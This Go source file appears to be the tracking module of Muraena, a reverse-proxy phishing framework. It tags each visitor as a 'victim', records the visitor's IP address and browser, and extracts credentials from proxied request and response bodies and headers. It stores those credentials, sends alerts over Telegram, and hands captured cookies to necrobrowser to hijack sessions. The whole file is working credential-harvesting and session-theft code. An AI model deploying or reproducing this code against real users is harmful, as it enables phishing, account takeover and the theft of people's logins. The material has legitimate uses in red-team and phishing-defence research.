package tracking

import (
	// "encoding/json"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/manifoldco/promptui"
	"github.com/muraenateam/muraena/log"

	"github.com/muraenateam/muraena/module/telegram"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/core/db"

	"github.com/evilsocket/islazy/tui"
	"github.com/lucasjones/reggen"

	"github.com/muraenateam/muraena/module/necrobrowser"
	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "tracker"

	// Description of this module
	Description = "Uniquely track clients via unique identifiers, while harvesting for web credentials and sessions"

	// Author of this module
	Author = "Muraena Team"
)

const (
	blockExtension = "JS,CSS,MAP,WOFF,SVG,SVC,JSON,GIF,ICO"
	blockMedia     = "image/*,audio/*,video/*,font/*"
)

var DisabledExtensions = strings.Split(strings.ToLower(blockExtension), ",")
var DisabledMedia = strings.Split(strings.ToLower(blockMedia), ",")

type LandingType int

const (
	LandingPath LandingType = iota
	LandingQuery
)

// Tracker object structure

// Tracker module
type Tracker struct {
	session.SessionModule

	Enabled        bool
	Type           LandingType
	Identifier     string
	Header         string
	LandingHeader  string
	ValidatorRegex *regexp.Regexp
	TrackerLength  int
}

// Trace object structure
type Trace struct {
	*Tracker
	ID string
}

// Name returns the module name
func (module *Tracker) Name() string {
	return Name
}

// Description returns the module description
func (module *Tracker) Description() string {
	return Description
}

// Author returns the module author
func (module *Tracker) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Tracker) Prompt() {

	menu := []string{
		"victims",
		"credentials",
		"export",
	}
	result, err := session.DoModulePrompt(Name, menu)
	if err != nil {
		return
	}

	switch result {
	case "victims":
		module.ShowVictims()

	case "credentials":
		module.ShowCredentials()

	case "export":
		prompt := promptui.Prompt{
			Label: "Enter session identifier",
		}

		result, err := prompt.Run()
		if core.IsError(err) {
			module.Warning("%v+\n", err)
			return
		}

		module.ExportSession(result)
	}
}

// IsEnabled returns a boolead to indicate if the module is enabled or not
func (module *Tracker) IsEnabled() bool {
	return module.Enabled
}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Tracker, err error) {

	m = &Tracker{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.Tracking.Enabled,
		Header:        "If-Range",                  // Default HTTP Header
		LandingHeader: "If-LandingHeader-Redirect", // Default LandingHeader HTTP Header
		// Type:          strings.ToLower(s.Config.Tracking.Trace.Landing.Type),
	}

	switch strings.ToLower(s.Config.Tracking.Trace.Landing.Type) {
	case "path":
		m.Type = LandingPath

	case "query":
	default:
		m.Type = LandingQuery
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.Tracking.Trace
	m.Identifier = config.Identifier

	// Set tracking header
	if s.Config.Tracking.Trace.Header != "" {
		m.Header = s.Config.Tracking.Trace.Header
	}

	// Set landing header
	if s.Config.Tracking.Trace.Landing.Header != "" {
		m.LandingHeader = s.Config.Tracking.Trace.Landing.Header
	}

	// Default Trace format is UUIDv4
	m.ValidatorRegex = regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3" +
		"}-[a-fA-F0-9]{12}$")

	if config.ValidatorRegex != "" {
		// Ensure the regex has anchors to match the full string, not just a substring
		validatorPattern := config.ValidatorRegex
		if !strings.HasPrefix(validatorPattern, "^") {
			validatorPattern = "^" + validatorPattern
		}
		if !strings.HasSuffix(validatorPattern, "$") {
			validatorPattern = validatorPattern + "$"
		}

		m.ValidatorRegex, err = regexp.Compile(validatorPattern)
		if err != nil {
			m.Warning("Failed to compile tracking validator regex: %s. Falling back to UUID4.", config.ValidatorRegex)
			return
		}
		m.Debug("Loaded validator regex: %s (original: %s)", validatorPattern, config.ValidatorRegex)
	} else {
		m.Debug("Using default UUID4 validator regex")
	}

	// get the tracker length
	m.TrackerLength = len(m.makeID())
	m.Debug("Tracker length: %d", m.TrackerLength)

	m.Important("loaded successfully")
	return
}

// IsValid validates the tracking value
func (t *Trace) IsValid() bool {
	if t.ValidatorRegex == nil {
		return false
	}

	return t.ValidatorRegex.MatchString(t.ID)
}

func isDisabledMethod(method string) bool {

	method = strings.ToUpper(method)
	var disabledMethods = []string{"HEAD", "OPTIONS"}
	for _, disabled := range disabledMethods {

		disabled = strings.ToUpper(disabled)
		if method == disabled {
			return true
		}
	}

	return false
}

func isDisabledMediaType(media string, disabledMedia []string) bool {

	media = strings.TrimSpace(strings.ToLower(media))
	if media == "" {
		return false
	}

	// Media LandingType handling.
	// Prevent processing of unwanted media types
	media = strings.TrimSpace(strings.ToLower(media))
	for _, skip := range disabledMedia {

		skip = strings.Split(skip, "*")[0]
		if strings.HasPrefix(media, skip) {
			return true
		}
	}

	return false
}

func isDisabledPath(requestPath string) bool {

	requestPath = strings.ToLower(requestPath)
	requestPath = strings.Split(requestPath, "?")[0]
	if requestPath == "" {
		return true
	}

	if strings.HasSuffix(requestPath, "/") {
		return true
	}

	file := path.Base(requestPath)
	ext := filepath.Ext(file)
	ext = strings.ReplaceAll(ext, ".", "")

	for _, disabled := range DisabledExtensions {
		if ext == disabled {
			return true
		}
	}

	return false
}

func (module *Tracker) makeTrace(id string) (t *Trace) {
	t = &Trace{}
	t.Tracker = module
	t.ID = strings.TrimSpace(id)
	return
}

func (module *Tracker) makeID() string {
	// Strip anchors (^ and $) from the regex pattern for generation
	// reggen doesn't need them and they might cause issues
	pattern := module.ValidatorRegex.String()
	pattern = strings.TrimPrefix(pattern, "^")
	pattern = strings.TrimSuffix(pattern, "$")

	str, err := reggen.NewGenerator(pattern)
	if err != nil {
		module.Error("Failed to create ID generator from pattern %s: %v", pattern, err)
		return ""
	}

	generated := str.Generate(1)
	module.Debug("Generated ID: %s (from pattern: %s)", generated, pattern)
	return generated
}

// TrackRequest tracks an HTTP RequestTemplate
func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {

	t = module.makeTrace("")

	// Do Not Track if not required
	if !module.Enabled {
		return
	}

	//
	// Requests to skip
	//
	if isDisabledMethod(request.Method) {
		return
	}

	if isDisabledMediaType(request.Header.Get("Access"), DisabledMedia) {
		return
	}

	if isDisabledMediaType(request.Header.Get("Content-Type"), DisabledMedia) {
		return
	}

	// Check if there's an existing tracking parameter/cookie BEFORE applying path filters
	// This ensures we don't skip requests with explicit tracking IDs (e.g., /?session=XXX)
	hasExistingTracking := false
	queryID := request.URL.Query().Get(module.Identifier)
	if queryID != "" {
		testTrace := module.makeTrace(queryID)
		if testTrace.IsValid() {
			module.Debug("[Early check] Found valid tracking ID in query: %s", queryID)
			hasExistingTracking = true
		}
	}
	if !hasExistingTracking {
		if c, err := request.Cookie(module.Identifier); err == nil {
			testTrace := module.makeTrace(c.Value)
			if testTrace.IsValid() {
				module.Debug("[Early check] Found valid tracking ID in cookie: %s", c.Value)
				hasExistingTracking = true
			}
		}
	}

	// Only apply path filter if there's no existing tracking
	// This prevents skipping important tracked requests like /?session=XXX
	if !hasExistingTracking && isDisabledPath(request.URL.Path) {
		module.Debug("[Path filter] Skipping untracked request to: %s", request.URL.Path)
		return
	}

	noTraces := true
	isTrackedPath := false

	//
	// Tracing types: Path || Query (default)
	//
	if module.Type == LandingPath {
		tr := module.Session.Config.Tracking

		pathRegex := strings.Replace(tr.Trace.Identifier, "_", "/", -1) + tr.Trace.ValidatorRegex
		re := regexp.MustCompile(pathRegex)

		match := re.FindStringSubmatch(request.URL.Path)
		if len(match) > 0 {
			extractedID := match[0]
			module.Debug("[Path-based tracking] Extracted ID from path: %s", extractedID)
			t = module.makeTrace(extractedID)
			if t.IsValid() {
				module.Debug("[Path-based tracking] ID validation successful: %s", t.ID)
				request.Header.Set(module.LandingHeader, strings.ReplaceAll(request.URL.Path, t.ID, ""))
				module.Info("Setting %s header to %s (tracked ID: %s)", module.LandingHeader,
					strings.ReplaceAll(request.URL.Path, t.ID, ""), t.ID)
				noTraces = false
				isTrackedPath = true
			} else {
				module.Debug("[Path-based tracking] ID validation failed for: %s (validator: %s)",
					extractedID, module.ValidatorRegex.String())
			}
		} else {
			module.Debug("[Path-based tracking] No match found in path: %s", request.URL.Path)
		}
	}

	if noTraces {
		// Fallback
		// Use Query String
		queryID := request.URL.Query().Get(module.Identifier)
		if queryID != "" {
			module.Debug("[Query-based tracking] Found query parameter '%s' with value: %s", module.Identifier, queryID)
			t = module.makeTrace(queryID)
			if t.IsValid() {
				module.Debug("[Query-based tracking] ID validation successful: %s", t.ID)
				noTraces = false
			} else {
				module.Debug("[Query-based tracking] ID validation failed for: %s (validator: %s)",
					queryID, module.ValidatorRegex.String())
			}
		} else {
			module.Debug("[Query-based tracking] Query parameter '%s' not found in request", module.Identifier)
		}

		// If query string didn't work, check cookies
		if noTraces {
			c, err := request.Cookie(module.Identifier)
			if err == nil {
				module.Debug("[Cookie-based tracking] Found cookie '%s' with value: %s", module.Identifier, c.Value)
				t.ID = c.Value

				// Validate cookie content
				if t.IsValid() {
					module.Debug("[Cookie-based tracking] ID validation successful: %s", t.ID)
					noTraces = false
				} else {
					module.Debug("[Cookie-based tracking] ID validation failed for: %s (validator: %s)",
						c.Value, module.ValidatorRegex.String())
					t = module.makeTrace("")
				}
			} else {
				module.Debug("[Cookie-based tracking] Cookie '%s' not found", module.Identifier)
			}
		}
	}

	if noTraces {
		module.Debug("[New ID generation] No valid tracking ID found, generating new one")
		t.ID = module.makeID()
		module.Debug("[New ID generation] Generated tracking ID: %s", t.ID)
	}

	//
	// Set trackers:
	// - HTTP Headers If-Range, or custom defined
	// This header is CRITICAL for redirect tracking - TrackResponse() relies on it
	request.Header.Set(module.Header, t.ID)
	module.Debug("[TrackRequest] Set tracking header '%s: %s' for request to %s", module.Header, t.ID, request.URL.Path)

	// Check if the Trace ID is bind to an existing victim
	v, verr := module.GetVictim(t)

	if v == nil || verr != nil {
		module.Error("%+v", verr)
		return
	}

	if v.ID == "" {
		// Tracking IP
		IPSource := GetRealAddr(request).String()
		newVictim := &db.Victim{
			ID:           t.ID,
			IP:           IPSource,
			UA:           request.UserAgent(),
			RequestCount: 1,
			FirstSeen:    time.Now().UTC().Format("2006-01-02 15:04:05"),
			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
		}

		module.PushVictim(newVictim)
		module.Info("[+] victim: %s \n\t%s\n\t%s", tui.Bold(tui.Red(t.ID)), tui.Yellow(IPSource), tui.Yellow(request.UserAgent()))
		// module.Debug("[%s] %s://%s%s", request.Method, request.URL.Scheme, request.Host, request.URL.Path)
	}

	if module.Type == LandingPath && isTrackedPath {
		if module.Session.Config.Tracking.Trace.Landing.RedirectTo != "" {
			targetURL, err := url.ParseRequestURI(module.Session.Config.Tracking.Trace.Landing.RedirectTo)
			if err != nil {
				log.Error("invalid redirect URL after landing path: %s", err)
			} else {
				request.URL = targetURL
			}
		}
	}

	return
}

// TrackResponse tracks an HTTP Response
// func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {
func (module *Tracker) TrackResponse(response *http.Response) (t *Trace) {

	// Do Not Track if not required
	if !module.Enabled {
		return
	}

	trackingFound := false
	t = module.makeTrace("")
	isRedirect := response.StatusCode >= 300 && response.StatusCode < 400

	module.Debug("[TrackResponse] Processing response: status=%d, url=%s, isRedirect=%v",
		response.StatusCode, response.Request.URL, isRedirect)

	// Check cookies first to avoid replacing issues
	for _, cookie := range response.Request.Cookies() {
		if cookie.Name == module.Identifier {
			t.ID = cookie.Value
			trackingFound = t.IsValid()
			module.Debug("[TrackResponse] Found tracking cookie in request: %s (valid=%v)", t.ID, trackingFound)
			break
		}
	}

	if !trackingFound {
		// Trace not found in Cookies check If-Range (or custom defined) HTTP Headers
		// CRITICAL: For redirects, we rely on the request header set by TrackRequest()
		// We do NOT parse the Location header - it may not contain the tracking ID
		headerID := response.Request.Header.Get(module.Header)
		module.Debug("[TrackResponse] Checking header '%s': %s", module.Header, headerID)

		if headerID == "" && isRedirect {
			module.Warning("[TrackResponse] REDIRECT detected but tracking header '%s' is EMPTY! "+
				"This means TrackRequest() was skipped. Original URL: %s", module.Header, response.Request.URL)
		}

		t = module.makeTrace(headerID)
		if t.IsValid() {
			cookieDomain := module.Session.Config.Proxy.Phishing
			if module.Session.Config.Tracking.Trace.Domain != "" {
				cookieDomain = module.Session.Config.Tracking.Trace.Domain
			}

			// Set tracking cookie and header
			cookieValue := fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
				module.Identifier, t.ID, cookieDomain)

			response.Header.Add("Set-Cookie", cookieValue)
			response.Header.Add(module.Header, t.ID)
			trackingFound = true

			if isRedirect {
				module.Info("[TrackResponse] Setting tracking cookie for REDIRECT (status=%d): ID=%s, domain=%s",
					response.StatusCode, t.ID, cookieDomain)
			} else {
				module.Info("[TrackResponse] Setting tracking cookie: ID=%s, domain=%s", t.ID, cookieDomain)
			}
			module.Debug("[TrackResponse] Cookie value: %s", cookieValue)
		} else {
			module.Debug("[TrackResponse] Header ID validation failed: %s (validator: %s)",
				headerID, module.ValidatorRegex.String())
		}
	}

	if !trackingFound {
		module.Verbose("[TrackResponse] Untracked response: status=%d, method=%s, url=%s",
			response.StatusCode, response.Request.Method, response.Request.URL)
		// Reset trace
		t = module.makeTrace("")
	} else {
		module.Debug("[TrackResponse] Successfully tracked: ID=%s, status=%d", t.ID, response.StatusCode)
	}

	return
}

// ExtractCredentials extracts credentials from a request body and stores within a VictimCredentials object
func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bool, err error) {

	found = false
	victim, err := t.GetVictim(t)
	if err != nil {
		t.Error("%s", err)
		return found, err
	}

	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
		matched := false
		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
			matched, _ = regexp.MatchString(c, request.URL.Path)
		} else {
			matched = request.URL.Path == c
		}

		if matched {
			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {

				// Case *sensitive* matching
				if strings.Contains(body, p.Matching) {
					// Extract it
					value := InnerSubstring(body, p.Start, p.End)
					if value != "" {
						found = true

						// Decode URL-encoded values
						mediaType := strings.ToLower(request.Header.Get("Content-Type"))
						if strings.Contains(mediaType, "urlencoded") {
							if v, err := url.QueryUnescape(value); err != nil {
								t.Warning("%s", err)
							} else {
								value = v
							}
						}

						creds := &db.VictimCredential{
							Key:   p.Label,
							Value: value,
							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
						}

						err := creds.Store(victim.ID)
						if err != nil {
							return false, err
						}

						message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
						// t.Debug("[+] Pattern: %v", p)
						t.Info("%s=%s (%s)", message, tui.Bold(tui.Red(creds.Value)), request.URL.Path)
						if tel := telegram.Self(t.Session); tel != nil {
							tel.Send(message)
						}
					}
				}
			}
		}
	}

	if found {
		t.ShowCredentials()
	}

	return found, nil
}

// ExtractCredentialsFromResponseHeaders extracts tracking credentials from response headers.
// It returns true if credentials are found, false otherwise.
func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (found bool, err error) {

	found = false
	victim, err := t.GetVictim(t)
	if err != nil {
		t.Error("%s", err)
		return found, err
	}

	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
		matched := false
		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
			matched, _ = regexp.MatchString(c, response.Request.URL.Path)
		} else {
			matched = response.Request.URL.Path == c
		}

		if matched {
			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {
				for k, v := range response.Header {

					// generate the header string:
					// key: value
					header := fmt.Sprintf("%s: %s", k, strings.Join(v, " "))

					if strings.Contains(header, p.Matching) {
						// Extract it
						value := InnerSubstring(header, p.Start, p.End)
						if value != "" {

							creds := &db.VictimCredential{
								Key:   p.Label,
								Value: value,
								Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
							}

							if err = creds.Store(victim.ID); err != nil {
								return false, err
							}

							found = true
							message := fmt.Sprintf("[%s] [+] credentials: %s", t.ID, tui.Bold(creds.Key))
							t.Info("%s=%s", message, tui.Bold(tui.Red(creds.Value)))
							if tel := telegram.Self(t.Session); tel != nil {
								tel.Send(message)
							}
						}
					}
				}
			}
		}

	}

	if found {
		t.ShowCredentials()
	}

	return found, nil
}

// ExtractCredentialsFromResponseBody extracts tracking credentials from response body.
// It returns true if credentials are found, false otherwise.
func (t *Trace) ExtractCredentialsFromResponseBody(body string, response *http.Response) (found bool, err error) {

	found = false
	victim, err := t.GetVictim(t)
	if err != nil {
		t.Error("%s", err)
		return found, err
	}

	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
		matched := false
		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
			matched, _ = regexp.MatchString(c, response.Request.URL.Path)
		} else {
			matched = response.Request.URL.Path == c
		}

		if matched {
			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {

				// Case *sensitive* matching
				if strings.Contains(body, p.Matching) {
					// Extract it
					value := InnerSubstring(body, p.Start, p.End)
					if value != "" {
						found = true

						creds := &db.VictimCredential{
							Key:   p.Label,
							Value: value,
							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
						}

						err := creds.Store(victim.ID)
						if err != nil {
							return false, err
						}

						message := fmt.Sprintf("[%s] [+] credentials (response): %s", t.ID, tui.Bold(creds.Key))
						t.Info("%s=%s (%s)", message, tui.Bold(tui.Red(creds.Value)), response.Request.URL.Path)
						if tel := telegram.Self(t.Session); tel != nil {
							tel.Send(message)
						}
					}
				}
			}
		}
	}

	if found {
		t.ShowCredentials()
	}

	return found, nil
}

// HijackSession If the request URL matches those defined in authSession in the config, then
// pass the cookies in the CookieJar to necrobrowser to hijack the session
func (t *Trace) HijackSession(request *http.Request) (err error) {

	if !t.Session.Config.Necrobrowser.Enabled {
		return
	}

	getSession := false

	victim, err := t.GetVictim(t)
	if err != nil {
		return
	}

	for _, c := range t.Session.Config.Necrobrowser.SensitiveLocations.AuthSession {
		if request.URL.Path == c {
			getSession = true
			break
		}
	}

	if !getSession {
		return
	}

	// Pass credentials
	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
	if err != nil {
		t.Warning(err.Error())
	}

	m, err := t.Session.Module("necrobrowser")
	if err != nil {
		t.Error("%s", err)
	} else {
		nb, ok := m.(*necrobrowser.Necrobrowser)
		if ok {
			go nb.Instrument(victim.ID, victim.Cookies, string(creds))
		}
	}

	return
}

// GetRealAddr returns the IP address from an http.Request
func GetRealAddr(r *http.Request) net.IP {
	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		if parts := strings.Split(forwarded, ","); len(parts) > 0 {
			// Intermediate nodes append, so first is the original client
			return net.ParseIP(strings.TrimSpace(parts[0]))
		}
	}

	addr, _, err := net.SplitHostPort(r.RemoteAddr)
	if err == nil {
		return net.ParseIP(addr)
	}
	return net.ParseIP(r.RemoteAddr)
}
